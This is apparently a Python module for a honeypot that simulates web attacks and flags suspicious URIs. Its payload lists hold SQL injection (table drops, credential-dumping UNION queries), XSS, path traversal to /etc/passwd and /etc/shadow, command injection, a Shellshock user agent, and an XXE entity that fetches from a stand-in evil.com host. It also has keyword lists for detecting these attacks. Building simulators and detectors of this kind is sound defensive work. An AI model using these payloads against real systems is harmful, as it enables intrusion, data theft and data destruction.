"""
Attack simulator for generating realistic attack patterns in the honeypot
"""

import random
import time
import threading
from typing import Dict, List, Any

class AttackSimulator:
    """Simulates various types of attacks for testing purposes."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.simulation_enabled = config.get('simulation', {}).get('enable_simulation', False)
        self.attack_patterns = self._load_attack_patterns()
    
    def _load_attack_patterns(self) -> Dict[str, List[str]]:
        """Load predefined attack patterns for simulation."""
        
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3,4--",
                "'; DROP TABLE users--",
                "' AND 1=1--",
                "' AND 1=2--",
                "admin'--",
                "' OR 'a'='a",
                "1' OR '1'='1' /*",
                "' UNION SELECT null,username,password FROM users--",
                "'; WAITFOR DELAY '00:00:05'--",
                "1; SELECT * FROM information_schema.tables--",
                "' OR (SELECT COUNT(*) FROM users) > 0--"
            ],
            
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src='javascript:alert(`XSS`)'></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>XSS</marquee>"
            ],
            
            'lfi': [
                "../etc/passwd",
                "..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "/etc/passwd%00",
                "....//....//....//boot.ini",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "file:///etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/proc/self/environ"
            ],
            
            'command_injection': [
                "; cat /etc/passwd",
                "| id",
                "& whoami",
                "; ls -la",
                "|| uname -a",
                "; pwd",
                "| cat /etc/shadow",
                "& netstat -an",
                "; ps aux",
                "| df -h"
            ],
            
            'xxe': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil.dtd'>]><foo>&xxe;</foo>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>"
            ],
            
            'generic': [
                "../",
                "admin",
                "test",
                "1",
                "true",
                "false",
                "",
                "null",
                "undefined"
            ]
        }
    
    def get_random_attack_payload(self, attack_type: str = None) -> str:
        """Get a random attack payload of specified type."""
        
        if not attack_type:
            attack_type = random.choice(list(self.attack_patterns.keys()))
        
        if attack_type in self.attack_patterns:
            return random.choice(self.attack_patterns[attack_type])
        else:
            return random.choice(self.attack_patterns['generic'])
    
    def simulate_user_agents(self) -> List[str]:
        """Get list of realistic and suspicious user agents."""
        
        return [
            # Normal browsers
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            
            # Suspicious/Scanner user agents
            "sqlmap/1.7.2#stable (http://sqlmap.org)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
            "Nikto/2.1.6",
            "python-requests/2.28.1",
            "curl/7.68.0",
            "Wget/1.20.3 (linux-gnu)",
            "ZmEu",
            "() { :; }; echo; /bin/cat /etc/passwd",  # Shellshock
            "<?php phpinfo(); ?>",
            
            # Custom scanner signatures
            "VulnScanner/1.0",
            "SecurityTest/1.0",
            "PenetrationTest",
            "BugBounty"
        ]
    
    def simulate_ip_addresses(self) -> List[str]:
        """Generate realistic source IP addresses."""
        
        # Mix of legitimate and suspicious IP ranges
        ip_ranges = [
            # Legitimate ranges
            "192.168.1.{}",   # Local network
            "10.0.0.{}",      # Private network
            "172.16.0.{}",    # Private network
            
            # Suspicious/known malicious ranges (for simulation)
            "185.220.100.{}",  # Tor exit nodes
            "45.129.32.{}",    # Suspicious range
            "104.248.{}",      # VPS providers
            "167.99.{}",       # Digital Ocean
            "134.209.{}",      # Digital Ocean
        ]
        
        ips = []
        for ip_range in ip_ranges:
            for i in range(1, 20):  # Generate 20 IPs per range
                ips.append(ip_range.format(random.randint(1, 254)))
        
        return ips
    
    def get_attack_vectors(self) -> Dict[str, List[str]]:
        """Get common attack vectors for different endpoints."""
        
        return {
            '/product.php': [
                'id=' + self.get_random_attack_payload('sql_injection'),
                'id=' + self.get_random_attack_payload('xss'),
                'category=' + self.get_random_attack_payload('sql_injection')
            ],
            
            '/search.php': [
                'q=' + self.get_random_attack_payload('xss'),
                'q=' + self.get_random_attack_payload('sql_injection'),
                'query=' + self.get_random_attack_payload('xss')
            ],
            
            '/file.php': [
                'file=' + self.get_random_attack_payload('lfi'),
                'filename=' + self.get_random_attack_payload('lfi'),
                'path=' + self.get_random_attack_payload('lfi')
            ],
            
            '/debug.php': [
                'debug=' + self.get_random_attack_payload('command_injection'),
                'cmd=' + self.get_random_attack_payload('command_injection'),
                'exec=' + self.get_random_attack_payload('command_injection')
            ],
            
            '/admin.php': [
                'auth=admin',
                'login=true',
                'bypass=1',
                'admin=1'
            ]
        }
    
    def generate_baseline_requests(self) -> List[Dict[str, Any]]:
        """Generate normal baseline requests for comparison."""
        
        baseline_requests = [
            {'method': 'GET', 'path': '/', 'params': {}},
            {'method': 'GET', 'path': '/product.php', 'params': {'id': '1'}},
            {'method': 'GET', 'path': '/product.php', 'params': {'id': '2'}},
            {'method': 'GET', 'path': '/product.php', 'params': {'id': '3'}},
            {'method': 'GET', 'path': '/search.php', 'params': {'q': 'laptop'}},
            {'method': 'GET', 'path': '/search.php', 'params': {'q': 'phone'}},
            {'method': 'GET', 'path': '/login.php', 'params': {}},
            {'method': 'POST', 'path': '/login.php', 'params': {'username': 'user', 'password': 'pass'}},
            {'method': 'GET', 'path': '/file.php', 'params': {'file': 'welcome.txt'}},
            {'method': 'GET', 'path': '/api/user', 'params': {'id': '1'}}
        ]
        
        return baseline_requests
    
    def is_attack_pattern(self, uri: str) -> Dict[str, Any]:
        """Analyze if a URI contains attack patterns."""
        
        analysis = {
            'is_attack': False,
            'attack_types': [],
            'confidence': 0.0,
            'patterns_found': []
        }
        
        uri_lower = uri.lower()
        
        # Check for SQL injection patterns
        sql_indicators = ["'", "union", "select", "drop", "insert", "update", "delete", "--", "/*", "*/"]
        sql_found = [pattern for pattern in sql_indicators if pattern in uri_lower]
        if sql_found:
            analysis['attack_types'].append('SQL_INJECTION')
            analysis['patterns_found'].extend(sql_found)
            analysis['confidence'] += 0.3
        
        # Check for XSS patterns
        xss_indicators = ["<script", "javascript:", "onerror", "onload", "alert(", "<img", "<svg"]
        xss_found = [pattern for pattern in xss_indicators if pattern in uri_lower]
        if xss_found:
            analysis['attack_types'].append('XSS')
            analysis['patterns_found'].extend(xss_found)
            analysis['confidence'] += 0.3
        
        # Check for LFI patterns
        lfi_indicators = ["../", "..\\", "/etc/", "c:\\", "boot.ini", "passwd", "win.ini"]
        lfi_found = [pattern for pattern in lfi_indicators if pattern in uri_lower]
        if lfi_found:
            analysis['attack_types'].append('LFI')
            analysis['patterns_found'].extend(lfi_found)
            analysis['confidence'] += 0.3
        
        # Check for command injection
        cmd_indicators = [";", "|", "&", "cat ", "ls ", "id", "whoami", "uname"]
        cmd_found = [pattern for pattern in cmd_indicators if pattern in uri_lower]
        if cmd_found:
            analysis['attack_types'].append('COMMAND_INJECTION')
            analysis['patterns_found'].extend(cmd_found)
            analysis['confidence'] += 0.3
        
        # Determine if it's an attack
        analysis['is_attack'] = len(analysis['attack_types']) > 0
        analysis['confidence'] = min(analysis['confidence'], 1.0)
        
        return analysis